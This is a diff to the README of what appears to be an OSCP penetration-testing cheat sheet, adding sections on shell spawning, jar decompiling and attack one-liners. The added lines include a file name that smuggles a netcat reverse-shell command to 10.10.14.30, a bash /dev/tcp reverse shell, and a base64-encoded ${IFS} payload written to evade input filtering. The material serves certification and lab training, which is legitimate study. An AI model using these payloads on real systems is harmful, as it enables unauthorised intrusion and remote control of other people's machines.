@@ -6,6 +6,8 @@ This repository describes cheat sheet and knowledge for OSCP.
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 **Table of Contents**
 
+- [oscp-cheatsheet](#oscp-cheatsheet)
+- [Contents](#contents)
 - [Enumeration](#enumeration)
   - [Network](#network)
     - [nmap](#nmap)
@@ -48,7 +50,7 @@ This repository describes cheat sheet and knowledge for OSCP.
         - [bitquark-subdomains-top100000.txt](#bitquark-subdomains-top100000txt)
 - [JWT (JSON Web Token) exploit](#jwt-json-web-token-exploit)
     - [Debugger](#debugger)
-    - [jwt_tool](#jwt_tool)
+    - [jwt\_tool](#jwt_tool)
       - [tampering](#tampering)
       - [exploit](#exploit)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
@@ -78,6 +80,11 @@ This repository describes cheat sheet and knowledge for OSCP.
   - [Convert Putty private key format to openssh](#convert-putty-private-key-format-to-openssh)
 - [Depixelize](#depixelize)
   - [Depix](#depix)
+- [Spawning shell](#spawning-shell)
+  - [python](#python)
+  - [echo](#echo)
+  - [bash](#bash)
+- [JDI](#jdi)
 - [Git](#git)
   - [Dump .git](#dump-git)
 - [Linux command](#linux-command)
@@ -88,6 +95,8 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Show the strings of printable characters in files](#show-the-strings-of-printable-characters-in-files)
     - [Read from standard input and write to standard output and files](#read-from-standard-input-and-write-to-standard-output-and-files)
     - [Find files created by a particular user](#find-files-created-by-a-particular-user)
+    - [Inject os command to file name](#inject-os-command-to-file-name)
+    - [Reverse shell by /dev/tcp/](#reverse-shell-by-devtcp)
     - [rlwrap](#rlwrap)
       - [nc (Listen port 9001)](#nc-listen-port-9001)
     - [Extract information from /etc/passwd](#extract-information-from-etcpasswd)
@@ -111,7 +120,7 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Create New file](#create-new-file)
     - [Display the contents of a text file](#display-the-contents-of-a-text-file)
     - [Get a file via HTTP (equivalent to wget)](#get-a-file-via-http-equivalent-to-wget)
-- [Python](#python)
+- [Python](#python-1)
   - [Run HTTP Server](#run-http-server)
     - [python3](#python3)
     - [python2](#python2)
@@ -527,6 +536,26 @@ python3 depix.py \
 ```
 
 
+# Spawning shell
+## python
+```shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+## echo
+```shell
+echo 'os.system('/bin/bash')'
+```
+## bash
+```shell
+/bin/bash -i
+```
+
+# JDI
+Decompiling jar and class.
+```shell
+jd-gui <filename>
+```
+
 # Git
 ## Dump .git
 https://github.com/arthaud/git-dumper
@@ -568,6 +597,26 @@ echo <text> | tee -a <file>
 ### Find files created by a particular user
 ```shell
 find / -type f -user user
+```
+
+### Inject os command to file name
+```shell
+touch  ';nc -c bash 10.10.14.30 4321;.php'
+```
+'.php' is an extension
+
+### Reverse shell by /dev/tcp/
+```shell
+echo "bash -i >& /dev/tcp/<your-ip>/1234 0>&1"
+```
+
+Note that the above command cannot be combinated with ${IFS} due to "ambiguous redirect"... Therefore, we can encode the above command by base64.
+```shell
+echo "bash -i >& /dev/tcp/<your-ip>/1234 0>&1" | base64 -w 0
+```
+When we send the payload the encoded command, add decoding command:
+```shell
+;echo${IFS}"<your payload here>"${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
 ```
 
 ### rlwrap
@@ -652,6 +701,8 @@ pdfimages in.pdf outputimage
 ```
 
 
+
+
 # Windows command
 ## Powershell
 ### Create New file
@@ -683,6 +734,8 @@ python -m http.server <port>
 ```
 python -m SimpleHTTPServer <port>
 ```
+
+
 
 ## Run system command by using dynamic import
 ```python
